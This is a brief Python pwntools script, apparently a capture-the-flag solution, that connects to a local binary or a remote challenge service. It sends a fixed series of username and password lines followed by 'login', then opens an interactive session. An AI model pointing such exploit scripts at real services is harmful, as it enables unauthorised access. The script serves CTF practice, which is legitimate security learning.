from pwn import *
from time import *
debug = True
local = True
x86 = True
if debug:
	context.log_level = 'debug'
else:
	context.log_level = 'info'
if x86:
	libc = ELF('/lib32/libc.so.6')
else:
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
if local:
	p = process('./daaa')
else:
	p = remote('127.16.1.102',20002)

p.sendline("xman 1234")
p.sendline("cyberpeace 1234")
p.sendline("cyberpeace 1234")
p.sendline("login")
p.interactive()
